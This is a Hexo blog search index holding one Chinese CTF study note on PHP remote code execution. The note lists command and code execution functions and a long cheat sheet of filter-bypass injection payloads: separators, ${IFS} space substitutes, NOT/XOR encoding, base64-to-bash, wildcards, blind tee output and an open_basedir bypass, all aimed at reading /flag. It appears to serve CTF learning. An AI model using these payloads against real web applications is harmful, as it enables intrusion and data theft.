<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RCE</title>
      <link href="/2025/03/02/RCE/"/>
      <url>/2025/03/02/RCE/</url>
      
        <content type="html"><![CDATA[<p>RCE:</p><p>1.简述：</p><p>在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。</p><p>危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。</p><p> 比如：如果应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><p>2.分类：命令执行和代码执行</p><p>3.常见函数：</p><p> (1)命令执行函数：</p><p>system()：能将字符串作为OS命令执行，且返回命令执行结果；</p><p>exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</p><p>shell_exec()：能将字符串作为OS命令执行</p><p>passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</p><p>popen()：打开进程文件指针</p><p>proc_open()：与popen()类似</p><p>pcntl_exec()：在当前进程空间执行指定程序；</p><p>反引号<code>：反引号</code>内的字符串会被解析为OS命令；</p><p>补充：OS命令执行是指将用户的文本命令通过操作系统转化为二进制指令并执行的过程</p><p>(2)代码执行函数：</p><p>eval()：将字符串作为php代码执行；</p><p>assert()：将字符串作为php代码执行；</p><p>preg_replace()：正则匹配替换字符串；</p><p>create_function()：主要创建匿名函数；</p><p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p><p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p><p>可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；</p><p>4.常见绕过：</p><p>(1)管道符绕过：</p><p>；：即；前后都执行</p><p>&amp;：即&amp;前后都执行</p><p>&amp;&amp;：即如果&amp;&amp;前为真才执行&amp;&amp;后面的，不然只执行&amp;&amp;前面的</p><p>| ：即显示|后面的执行结果</p><p>||：||前面为假时才执行||后面的，否则只执行||前面的</p><p>(2)空格过滤：</p><p>空格可以替换成：</p><p>&lt;  &lt;&gt;  %20(即space) %09(即TAB)  $IFS$9  ${IFS}  $IFS  {}</p><p>(3)反斜杠：</p><p>如cat、ls被过滤，使用\绕过：<br>c\at &#x2F;flag<br>l\s &#x2F;</p><p>(4)取反绕过：</p><p>&#x2F;&#x2F;取反传参<br>&lt;?php</p><p>$a &#x3D; “system”;<br>$b &#x3D; “cat &#x2F;flag”;</p><p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p><p>&#x2F;&#x2F;输出得到取反传参内容<br>echo “?cmd&#x3D;(<del>“.$c.”)(</del>“.$d.”);”<br>?&gt;</p><p>(5)异或绕过:</p><p>这里推荐yu师傅的脚本</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p>(6)黑名单绕过：</p><p>&#x2F;&#x2F;变量拼接，如flag被过滤<br>将：<br>cat &#x2F;flag<br>替换为：<br>b&#x3D;ag;cat &#x2F;fl$b</p><p>&#x2F;&#x2F;读取根目录<br>eval(var_dump(scandir(‘&#x2F;‘););<br>&#x2F;&#x2F;读flag<br>eval(var_dump(file_get_contents($_POST[‘a’])););&amp;a&#x3D;&#x2F;flag</p><p>&#x2F;&#x2F;等效于打开ls目录下的文件<br>cat <code>ls</code></p><p>&#x2F;&#x2F;<em>被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线</em><br>N[S.S等效于N_S.S<br>php需要接收e_v.a.l参数,给e[v.a.l传参即可</p><p>&#x2F;&#x2F;php标签绕过<br>?&gt;<?= phpinfo(); ?></p><p>(7)base和hexo编码绕过：</p><p>&#x2F;&#x2F;base64编码绕过,编码cat &#x2F;flag，反引号、| bash、$()用于执行系统命令<br><code>echo Y2F0IC9mbGFn | base64 -d</code><br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p><p>&#x2F;&#x2F;hex编码绕过，编码cat &#x2F;flag,| bash用于执行系统命令<br>echo ‘636174202f666c6167’ | xxd -r -p | bash</p><p>&#x2F;&#x2F;shellcode编码<br>&#x2F;&#x2F;十六进制编码</p><p>(8)正则匹配绕过：</p><p>&#x2F;&#x2F;如flag被过滤<br>cat &#x2F;f???<br>cat &#x2F;fl*<br>cat &#x2F;f[a-z]{3}</p><p>cat &#x2F;?l*</p><p>(9)引号绕过：</p><p>&#x2F;&#x2F;如cat、ls被过滤*</p><p>ca””t &#x2F;flag</p><p>l’s’ &#x2F;</p><p>(10)cat替换命令：</p><p>tac与cat相反，按行反向输出<br>more按页显示，用于文件内容较多且不能滚动屏幕时查看文件<br>less与more类似<br>tail查看文件末几行<br>head查看文件首几行<br>nl在cat查看文件的基础上显示行号<br>od以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符<br>xxd以二进制方式读文件，同时有可读字符显示<br>sort排序文件<br>uniq报告或删除文件的重复行<br>file -f报错文件内容<br>grep过滤查找字符串，grep flag &#x2F;flag</p><p>strings(也是)</p><p>(11)无回显绕过：</p><p>&#x2F;&#x2F;无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可<br>ls &#x2F; | tee 1.txt<br>cat &#x2F;flag | tee 2.txt<br>&#x2F;&#x2F;eval()无输出<br>eval(print<code>c\at /flag</code>;)</p><p>(12)</p><p>无参数RCE</p><p>​    利用getallheaders()、get_defined_vars()、session_id等；</p><p>无字母数字RCE</p><p>​    异或、取反、自增、临时文件上传；</p><p>(14)取反绕过：</p><p>&#x2F;&#x2F;取反传参<br>&lt;?php</p><p>$a &#x3D; “system”;<br>$b &#x3D; “cat &#x2F;flag”;</p><p>$c &#x3D; urlencode(<del>$a);<br>$d &#x3D; urlencode(</del>$b);</p><p>&#x2F;&#x2F;输出得到取反传参内容<br>echo “?cmd&#x3D;(<del>“.$c.”)(</del>“.$d.”);”<br>?&gt;</p><p>(15)长度限制：</p><p>touch “ag”</p><p>touch “fl\“</p><p>touch “t \“</p><p>touch “ca\“</p><p>ls -t</p><p>-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</p><p>ls -t &gt; shell</p><p>sh shell(读取flag)</p><p>空格\ ： 这个其实是换行。<br>ls -t ：按照时间将文本排序输出<br>ls -t &gt; shell：将ls -t的输出储存到shell文件中<br>我们首先是用touch命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个\的原因在于，第一个\用于将后面的\变成字符串，第二个\是用来将后面的文本转换为字符串，以便用于后面的测试。</p><p>补充：</p><p>关于有一些全是报错的；就比如使用var_export(scandir(“&#x2F;“));扫描根目录文件结果发现全是？！什么的；就是全给你替换了，我们可以结合 exit() 函数执行php代码让后面的匹配缓冲区不执行直接退出</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>使用 glob:&#x2F;&#x2F; 伪协议绕过 open_basedir，读取根目录下的文件，payload：</p><p>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?>或者c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit(0);</p><p>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;getFilename().” “);} exit(0);</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
